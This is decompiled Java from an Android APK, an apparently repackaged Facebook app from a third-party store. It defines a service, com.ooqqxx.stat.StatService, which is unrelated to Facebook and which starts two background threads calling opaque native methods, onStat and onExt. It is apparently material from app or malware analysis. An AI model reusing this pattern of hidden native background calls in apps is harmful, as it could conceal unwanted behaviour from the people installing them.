package com.ooqqxx.stat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class StatService extends Service
{
  Thread extThread = null;
  Thread statThread = null;

  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }

  public void onCreate()
  {
  }

  public void onDestroy()
  {
    super.onDestroy();
  }

  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    if ((this.statThread == null) || (!this.statThread.isAlive()))
    {
      this.statThread = new Thread(new Runnable(paramIntent)
      {
        public void run()
        {
          NativeCall.onStat(StatService.this, this.val$intent);
        }
      });
      this.statThread.start();
    }
    if ((this.extThread == null) || (!this.extThread.isAlive()))
    {
      this.extThread = new Thread(new Runnable(paramIntent)
      {
        public void run()
        {
          NativeCall.onExt(StatService.this, this.val$intent);
        }
      });
      this.extThread.start();
    }
  }
}

/* Location:           /data1/software/jd-gui/com.facebook.katana_2.0_liqucn.com-dex2jar.jar
 * Qualified Name:     com.ooqqxx.stat.StatService
 * JD-Core Version:    0.6.0
 */